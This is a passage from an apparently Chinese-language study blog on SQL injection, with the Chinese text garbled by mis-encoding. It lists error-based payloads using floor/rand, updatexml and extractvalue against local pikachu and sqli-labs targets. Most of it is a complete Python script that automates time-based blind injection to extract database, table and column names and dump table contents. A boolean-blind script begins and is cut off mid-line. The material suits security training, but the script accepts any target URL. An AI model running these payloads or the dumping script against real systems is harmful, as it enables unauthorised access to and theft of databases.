class="line">http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=56 and (select 1 from (select count(*) ,concat((select concat(0x7e,database(),0x7e) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure><h5 id="updatexml-1"><a href="#updatexml-1" class="headerlink" title="updatexml"></a>updatexml</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=56 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br></pre></td></tr></table></figure><h5 id="extractvalue-1"><a href="#extractvalue-1" class="headerlink" title="extractvalue"></a>extractvalue</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=56 and extractvalue(1,concat(0x7e,database(),0x7e))</span><br></pre></td></tr></table></figure><h3 id="åŸºäºæ—¶é—´çš„-SQL-ç›²æ³¨-å»¶æ—¶åˆ¤æ–­"><a href="#åŸºäºæ—¶é—´çš„-SQL-ç›²æ³¨-å»¶æ—¶åˆ¤æ–­" class="headerlink" title="åŸºäºæ—¶é—´çš„ SQL ç›²æ³¨-å»¶æ—¶åˆ¤æ–­"></a>åŸºäºæ—¶é—´çš„ SQL ç›²æ³¨-å»¶æ—¶åˆ¤æ–­</h3><h4 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">like &#x27;ro%&#x27;                      #åˆ¤æ–­roæˆ–ro...æ˜¯å¦æˆç«‹</span><br><span class="line">regexp &#x27;^xiaodi[1-z]&#x27;    #åŒ¹é…xiaodiåŠxiaodi...ç­‰</span><br><span class="line">if(æ¡ä»¶,5,0)                   #æ¡ä»¶æˆç«‹ï¼Œè¿”å›5ï¼Œåä¹‹ï¼Œè¿”å›0</span><br><span class="line">sleep(5)                       #SQLè¯­å¥å»¶æ—¶æ‰§è¡Œ5ç§’</span><br><span class="line">mid(a,b,c)                    #ä»ä½ç½®bå¼€å§‹ï¼Œæˆªå–aå­—ç¬¦ä¸²çš„cä½</span><br><span class="line">substr(a,b,c)                #ä»Bä½ç½®å¼€å§‹ï¼Œæˆªå–å­—ç¬¦ä¸²açš„cé•¿åº¦</span><br><span class="line">left(database(),1),database()    #left(a,b)ä»å·¦ä¾§æˆªå–açš„å‰bä½</span><br><span class="line">length(database())=8   #åˆ¤æ–­æ•°æ®åº“database()åçš„é•¿åº¦</span><br><span class="line">ascii() å­—ç¬¦ä¸²è½¬æ¢asciiç </span><br><span class="line">ord     asciiç è½¬æ¢ä¸ºæ•°å­—</span><br><span class="line">ord=ascii ascii(x)=97   #åˆ¤æ–­xçš„asciiç æ˜¯å¦ç­‰äº97</span><br></pre></td></tr></table></figure><p>é¡µé¢é”™è¯¯å’Œæ­£ç¡®è¿”å›ä¸€æ ·ã€‚ä¸€èˆ¬éƒ½ç”¨è„šæœ¬è·‘</p><h4 id="æŸ¥çœ‹æ•°æ®åº“"><a href="#æŸ¥çœ‹æ•°æ®åº“" class="headerlink" title="æŸ¥çœ‹æ•°æ®åº“"></a>æŸ¥çœ‹æ•°æ®åº“</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payloadï¼šif(ascii(substr(database(),1,1))=114,sleep(5),1)</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹è¡¨å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit    0,1),1,1))=101,sleep(3),0)--+</span><br></pre></td></tr></table></figure><h4 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">author : L0ne1y</span><br><span class="line">time : 2021-08-29</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def close(url):</span><br><span class="line">    s = input(&quot;è¯·è¾“å…¥é—­åˆæ–¹å¼:&quot;)</span><br><span class="line">    url = url + s</span><br><span class="line">    return url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def db_ascii_list():</span><br><span class="line">    ascii_list = []</span><br><span class="line">    for i in range(33, 127):</span><br><span class="line">        ascii_list.append(chr(i))</span><br><span class="line">    return ascii_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># çˆ†ç ´æ•°æ®åº“å</span><br><span class="line">def db_name(url, str, ascii_list):</span><br><span class="line">    print(&quot;[-]å¼€å§‹çˆ†ç ´æ•°æ®åº“å.......&quot;)</span><br><span class="line">    num = 1</span><br><span class="line">    while True:</span><br><span class="line">        db_payload = url + &quot; and if(length(database())=%d,sleep(2),1) --+&quot; % num</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        # print(db_payload)</span><br><span class="line">        r = requests.get(db_payload)</span><br><span class="line">        if time.time() - start_time &gt; 2:</span><br><span class="line">            db_length = num</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            num += 1</span><br><span class="line">    # print(db_length)</span><br><span class="line">    db_name = &#x27;&#x27;</span><br><span class="line">    for i in range(1, db_length + 1):</span><br><span class="line">        max = 127</span><br><span class="line">        min = 33</span><br><span class="line">        while abs(max - min) &gt; 1:</span><br><span class="line">            midx = int((max + min) / 2)</span><br><span class="line">            db_name_payload = url + &quot; and if(ord(mid((database()),%d,1))&gt;%d,sleep(2),1) --+&quot; % (i, midx)</span><br><span class="line">            # print(db_name_payload)</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            r = requests.get(db_name_payload)</span><br><span class="line">            if time.time() - start_time &gt; 2:</span><br><span class="line">                min = midx</span><br><span class="line">            else:</span><br><span class="line">                max = midx</span><br><span class="line">        db_name += chr(max)</span><br><span class="line">    print(&quot;[+]æ•°æ®åº“åï¼š%s\n&quot; % db_name)</span><br><span class="line">    return db_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># çˆ†ç ´è¡¨å</span><br><span class="line">def tb_name(url, str, ascii_list, db_name):</span><br><span class="line">    print(&quot;[-]å¼€å§‹çˆ†ç ´è¡¨å&quot;)</span><br><span class="line">    i = 1</span><br><span class="line">    while True:</span><br><span class="line">        tb_payload = url + &quot; and if((select count(table_name) from information_schema.tables where table_schema=&#x27;%s&#x27;)=%d,sleep(2),1) --+&quot; % (</span><br><span class="line">            db_name, i)</span><br><span class="line">        # print(tb_payload)</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.get(tb_payload)</span><br><span class="line">        if time.time() - start_time &gt; 2:</span><br><span class="line">            tb_number = i</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            i += 1</span><br><span class="line">    j = 1</span><br><span class="line">    tb_name_length = []</span><br><span class="line">    for i in range(tb_number):</span><br><span class="line">        while True:</span><br><span class="line">            tb_name_length_payload = url + &quot; and if((select length(table_name) from information_schema.tables where table_schema=&#x27;%s&#x27; limit %d,1)=%d,sleep(2),1) --+&quot; % (</span><br><span class="line">                db_name, i, j)</span><br><span class="line">            # print(tb_name_length_payload)</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            r = requests.get(tb_name_length_payload)</span><br><span class="line">            if time.time() - start_time &gt; 2:</span><br><span class="line">                tb_name_length.append(j)</span><br><span class="line">                j = 1</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                j += 1</span><br><span class="line"></span><br><span class="line">    tb_name_list = []</span><br><span class="line">    for i in range(tb_number):</span><br><span class="line">        tb_name = &#x27;&#x27;</span><br><span class="line">        for j in range(1, tb_name_length[i] + 1):</span><br><span class="line">            max = 127</span><br><span class="line">            min = 33</span><br><span class="line">            while abs((max - min)) &gt; 1:</span><br><span class="line">                midx = int((max + min) / 2)</span><br><span class="line">                tb_name_payload = url + &quot; and if(ord(mid((select table_name from information_schema.tables where table_schema=&#x27;%s&#x27; limit %d,1),%d,1))&gt;%d,sleep(2),1) --+&quot; % (</span><br><span class="line">                    db_name, i, j, midx)</span><br><span class="line">                start_time = time.time()</span><br><span class="line">                r = requests.get(tb_name_payload)</span><br><span class="line">                # print(tb_name_payload)</span><br><span class="line">                if time.time() - start_time &gt; 2:</span><br><span class="line">                    min = midx</span><br><span class="line">                else:</span><br><span class="line">                    max = midx</span><br><span class="line">            tb_name += chr(max)</span><br><span class="line">        tb_name_list.append(tb_name)</span><br><span class="line">    print(&quot;\n[+]%såº“ä¸‹çš„%då¼ è¡¨ä¸ºï¼š%s\n&quot; % (db_name, tb_number, tb_name_list))</span><br><span class="line">    return tb_name_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def column_name(url, str, ascii_list, tb_name_list, db_name):</span><br><span class="line">    while True:</span><br><span class="line">        tb_name = input(&quot;è¯·è¾“å…¥ä½ é€‰æ‹©çš„è¡¨å(ä¾‹å¦‚ admin):&quot;)</span><br><span class="line">        if tb_name in tb_name_list:</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;è¾“å…¥çš„è¡¨åæœ‰è¯¯,è¯·é‡æ–°è¾“å…¥&quot;)</span><br><span class="line"></span><br><span class="line">    j = 1</span><br><span class="line">    while True:</span><br><span class="line">        column_num_payload = url + &quot; and if((select count(column_name) from information_schema.columns where table_name=&#x27;%s&#x27; and table_schema=&#x27;%s&#x27;)=%d,sleep(2),1) --+&quot; % (</span><br><span class="line">            tb_name, db_name, j)</span><br><span class="line">        # print(column_num_payload)</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.get(column_num_payload)</span><br><span class="line">        if time.time() - start_time &gt; 2:</span><br><span class="line">            column_num = j</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            j += 1</span><br><span class="line"></span><br><span class="line">    column_name_length = []</span><br><span class="line">    k = 1</span><br><span class="line">    for j in range(column_num):</span><br><span class="line">        while True:</span><br><span class="line">            column_name_length_payload = url + &quot; and if((select length(column_name) from information_schema.columns where table_name=&#x27;%s&#x27; and table_schema=&#x27;%s&#x27; limit %d,1)=%d,sleep(2),1) --+&quot; % (</span><br><span class="line">                tb_name, db_name, j, k)</span><br><span class="line">            # print(column_name_length_payload)</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            r = requests.get(column_name_length_payload)</span><br><span class="line">            if time.time() - start_time &gt; 2:</span><br><span class="line">                column_name_length.append(k)</span><br><span class="line">                k = 1</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                k += 1</span><br><span class="line"></span><br><span class="line">    print(&quot;[-]å¼€å§‹çˆ†ç ´%sè¡¨çš„å­—æ®µå:&quot; % tb_name)</span><br><span class="line">    column_name_list = []</span><br><span class="line">    for i in range(len(column_name_length)):</span><br><span class="line">        column_name = &#x27;&#x27;</span><br><span class="line">        for j in range(1, column_name_length[i] + 1):</span><br><span class="line">            max = 127</span><br><span class="line">            min = 33</span><br><span class="line">            while abs(max - min) &gt; 1:</span><br><span class="line">                midx = int((max + min) / 2)</span><br><span class="line">                column_name_payload = url + &quot; and if(ord(mid((select column_name from information_schema.columns where table_name=&#x27;%s&#x27; and table_schema=&#x27;%s&#x27; limit %d,1),%d,1))&gt;%d,sleep(2),1) --+&quot; % (</span><br><span class="line">                    tb_name, db_name, i, j, midx)</span><br><span class="line">                # print(column_name_payload)</span><br><span class="line">                start_time = time.time()</span><br><span class="line">                r = requests.get(column_name_payload)</span><br><span class="line">                if time.time() - start_time &gt; 2:</span><br><span class="line">                    min = midx</span><br><span class="line">                else:</span><br><span class="line">                    max = midx</span><br><span class="line">            column_name += chr(max)</span><br><span class="line">        column_name_list.append(column_name)</span><br><span class="line">    print(&quot;[+]%sè¡¨çš„å­—æ®µååˆ†åˆ«ä¸º:%s&quot; % (tb_name, column_name_list))</span><br><span class="line">    return column_name_list, tb_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dump_data(url, str, tb_name, db_name, column_name_list):</span><br><span class="line">    i = 1</span><br><span class="line">    while True:</span><br><span class="line">        data_num_payload = url + &quot; and if((select count(*) from %s.%s)=%d,sleep(2),1) --+&quot; % (</span><br><span class="line">            db_name, tb_name, i)</span><br><span class="line">        # print(data_num_payload)</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.get(data_num_payload)</span><br><span class="line">        if time.time() - start_time &gt; 2:</span><br><span class="line">            data_num = i</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            i += 1</span><br><span class="line">    print(&quot;[-]å¼€å§‹çˆ†ç ´%sæ•°æ®åº“çš„%sè¡¨ä¸­æ•°æ®:&quot; % (db_name, tb_name))</span><br><span class="line">    k = 1</span><br><span class="line">    data_length = []</span><br><span class="line">    dump_data_list = []</span><br><span class="line">    dump_data = &#x27;&#x27;</span><br><span class="line">    for i in column_name_list:</span><br><span class="line">        for j in range(data_num):</span><br><span class="line">            while True:</span><br><span class="line">                dump_data_length_payload = url + &quot; and if(ascii(substr((select %s from %s.%s limit %d,1),%d,1)),sleep(2),1) --+&quot; % (</span><br><span class="line">                    i, db_name, tb_name, j, k)</span><br><span class="line">                # print(dump_data_length_payload)</span><br><span class="line">                start_time = time.time()</span><br><span class="line">                r = requests.get(dump_data_length_payload)</span><br><span class="line">                if time.time() - start_time &lt; 2:</span><br><span class="line">                    dump_data_length = k - 1</span><br><span class="line">                    k = 1</span><br><span class="line">                    break</span><br><span class="line">                else:</span><br><span class="line">                    k += 1</span><br><span class="line">            data_length.append(dump_data_length)</span><br><span class="line">            for l in range(1, dump_data_length + 1):</span><br><span class="line">                max = 127</span><br><span class="line">                min = 33</span><br><span class="line">                while abs(max - min) &gt; 1:</span><br><span class="line">                    midx = int((max + min) / 2)</span><br><span class="line">                    dump_data_payload = url + &quot; and if(ord(mid((select %s from %s.%s limit %d,1),%d,1))&gt;%d,sleep(2),1) --+&quot; % (</span><br><span class="line">                        i, db_name, tb_name, j, l, midx)</span><br><span class="line">                    # print(dump_data_payload)</span><br><span class="line">                    start_time = time.time()</span><br><span class="line">                    r = requests.get(dump_data_payload)</span><br><span class="line">                    if time.time() - start_time &gt; 2:</span><br><span class="line">                        min = midx</span><br><span class="line">                    else:</span><br><span class="line">                        max = midx</span><br><span class="line">                dump_data += chr(max)</span><br><span class="line">                # print(dump_data)</span><br><span class="line">            dump_data_list.append(dump_data)</span><br><span class="line">            dump_data = &#x27;&#x27;</span><br><span class="line">            # print( dump_data_list)</span><br><span class="line">    print(&quot;[+]%sæ•°æ®åº“çš„%sè¡¨çš„æ•°æ®:&quot; % (db_name, tb_name))</span><br><span class="line">    j = 0</span><br><span class="line">    num_1 = len(dump_data_list) // data_num</span><br><span class="line">    for i in range(data_num):</span><br><span class="line">        j = i</span><br><span class="line">        for k in range(num_1):</span><br><span class="line">            print(&quot;%s\t\t&quot; % dump_data_list[j], end=&#x27;&#x27;)</span><br><span class="line">            j = i + data_num</span><br><span class="line">        print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def re(url, str, ascii_list, tb_name_list, db_name):</span><br><span class="line">    while True:</span><br><span class="line">        tb_name = input(&quot;å¦‚éœ€è·‘å…¶ä»–è¡¨,è¯·è¾“å…¥ä»»æ„å­—ç¬¦,å¦åˆ™è¾“å…¥No(ä¾‹å¦‚ admin):&quot;)</span><br><span class="line">        if tb_name == &#x27;NO&#x27; or tb_name == &#x27;No&#x27; or tb_name == &#x27;no&#x27;:</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            print(tb_name_list)</span><br><span class="line">            column_name_list, tb_name = column_name(url, str, ascii_list, tb_name_list, db_name)</span><br><span class="line">            dump_data(url, str, tb_name, db_name, column_name_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = input(&quot;è¯·è¾“å…¥URL:&quot;)  # ç›®æ ‡url http://127.0.0.1/sqli/Less-5/?id=1</span><br><span class="line">url = close(url)</span><br><span class="line">ascii_list = db_ascii_list()</span><br><span class="line">db_name = db_name(url, str, ascii_list)</span><br><span class="line">tb_name_list = tb_name(url, str, ascii_list, db_name)</span><br><span class="line">column_name_list, tb_name = column_name(url, str, ascii_list, tb_name_list, db_name)</span><br><span class="line">dump_data(url, str, tb_name, db_name, column_name_list)</span><br><span class="line">re(url, str, ascii_list, tb_name_list, db_name)</span><br></pre></td></tr></table></figure><h3 id="åŸºäºå¸ƒå°”çš„SQLç›²æ³¨-é€»è¾‘åˆ¤æ–­"><a href="#åŸºäºå¸ƒå°”çš„SQLç›²æ³¨-é€»è¾‘åˆ¤æ–­" class="headerlink" title="åŸºäºå¸ƒå°”çš„SQLç›²æ³¨-é€»è¾‘åˆ¤æ–­"></a>åŸºäºå¸ƒå°”çš„SQLç›²æ³¨-é€»è¾‘åˆ¤æ–­</h3><p>ä¸€èˆ¬éƒ½ç”¨è„šæœ¬è·‘</p><p>é¡µé¢åªè¿”å›Trueå’ŒFalseä¸¤ç§ç±»å‹é¡µé¢ã€‚åˆ©ç”¨é¡µé¢è¿”å›ä¸åŒï¼Œé€ä¸ªçŒœè§£æ•°æ®ã€‚ä¹Ÿå¯ä»¥ç”¨æ—¶é—´ç›²æ³¨</p><p>æŸ¥æ•°æ®åº“åé•¿åº¦ï¼Œéœ€è¦ä¸€ä¸ªä¸€ä¸ªè¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())=8 --+</span><br></pre></td></tr></table></figure><h4 id="è„šæœ¬-1"><a href="#è„šæœ¬-1" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def close(url):</span><br><span class="line">    s = input(&quot;è¯·è¾“å…¥é—­åˆæ–¹å¼:&quot;)</span><br><span class="line">    url = url + s</span><br><span class="line">    return url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def db_ascii_list():</span><br><span class="line">    ascii_list = []</span><br><span class="line">    for i in range(33, 127):</span><br><span class="line">        ascii_list.append(chr(i))</span><br><span class="line">    return ascii_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># çˆ†ç ´æ•°æ®åº“å</span><br><span class="line">def db_name(url, str, ascii_list):</span><br><span class="line">    print(&quot;[-]å¼€å§‹çˆ†ç ´æ•°æ®åº“å.......&quot;)</span><br><span class="line">    num = 1</span><br><span class="line">    while True:</span><br><span class="line">        db_payload = url + &quot; and length(database())=%d --+&quot; 